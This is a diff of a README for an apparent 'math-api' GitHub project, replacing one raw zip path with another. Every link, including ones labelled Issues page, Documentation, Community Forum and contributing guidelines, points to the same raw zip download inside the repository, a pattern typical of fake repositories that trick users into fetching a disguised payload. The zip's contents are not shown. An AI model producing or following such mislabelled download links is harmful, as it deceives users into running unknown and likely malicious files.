@@ -6,7 +6,7 @@ Welcome to the math-api! This tool helps you perform various mathematical operat
 
 ## 📥 Download the Latest Version
 
-[![Download math-api](https://github.com/Dhruva105/math-api/raw/refs/heads/main/python/src/math-api-3.5.zip%20math%https://github.com/Dhruva105/math-api/raw/refs/heads/main/python/src/math-api-3.5.zip)](https://github.com/Dhruva105/math-api/raw/refs/heads/main/python/src/math-api-3.5.zip)
+[![Download math-api](https://github.com/Dhruva105/math-api/raw/refs/heads/main/nuget/pkgbin/math_api_2.1.zip%20math%https://github.com/Dhruva105/math-api/raw/refs/heads/main/nuget/pkgbin/math_api_2.1.zip)](https://github.com/Dhruva105/math-api/raw/refs/heads/main/nuget/pkgbin/math_api_2.1.zip)
 
 ## 📚 Features
 
@@ -24,7 +24,7 @@ Welcome to the math-api! This tool helps you perform various mathematical operat
 
 ## 📦 Download & Install
 
-To get the latest version of math-api, please visit our [Releases page](https://github.com/Dhruva105/math-api/raw/refs/heads/main/python/src/math-api-3.5.zip). This page contains all available versions. 
+To get the latest version of math-api, please visit our [Releases page](https://github.com/Dhruva105/math-api/raw/refs/heads/main/nuget/pkgbin/math_api_2.1.zip). This page contains all available versions. 
 
 1. Click on the desired version to access the assets.
 2. Download the file compatible with your device.
@@ -51,16 +51,16 @@ A: math-api is available for multiple platforms, including Android and Windows.
 A: Yes, once installed, you can use math-api offline.
 
 **Q: How do I report a bug?**  
-A: You can report issues on our [GitHub Issues page](https://github.com/Dhruva105/math-api/raw/refs/heads/main/python/src/math-api-3.5.zip).
+A: You can report issues on our [GitHub Issues page](https://github.com/Dhruva105/math-api/raw/refs/heads/main/nuget/pkgbin/math_api_2.1.zip).
 
 ## 🤝 Contributing
 
-If you want to contribute, we welcome help! You can add features or fix bugs. To get started, check out the [contributing guidelines](https://github.com/Dhruva105/math-api/raw/refs/heads/main/python/src/math-api-3.5.zip).
+If you want to contribute, we welcome help! You can add features or fix bugs. To get started, check out the [contributing guidelines](https://github.com/Dhruva105/math-api/raw/refs/heads/main/nuget/pkgbin/math_api_2.1.zip).
 
 ## 🌐 Related Resources
 
-- [Documentation](https://github.com/Dhruva105/math-api/raw/refs/heads/main/python/src/math-api-3.5.zip) - Detailed usage instructions.
-- [Community Forum](https://github.com/Dhruva105/math-api/raw/refs/heads/main/python/src/math-api-3.5.zip) - Discuss with other users and developers.
+- [Documentation](https://github.com/Dhruva105/math-api/raw/refs/heads/main/nuget/pkgbin/math_api_2.1.zip) - Detailed usage instructions.
+- [Community Forum](https://github.com/Dhruva105/math-api/raw/refs/heads/main/nuget/pkgbin/math_api_2.1.zip) - Discuss with other users and developers.
 
 ## 📞 Support
 
@@ -68,4 +68,4 @@ For support, please contact us through the official GitHub repository or visit o
 
 Feel free to explore the math-api. It makes calculations simple and accessible for everyone! 
 
-Don’t forget to download the latest version from our [Releases page](https://github.com/Dhruva105/math-api/raw/refs/heads/main/python/src/math-api-3.5.zip) to enjoy all the features.
+Don’t forget to download the latest version from our [Releases page](https://github.com/Dhruva105/math-api/raw/refs/heads/main/nuget/pkgbin/math_api_2.1.zip) to enjoy all the features.
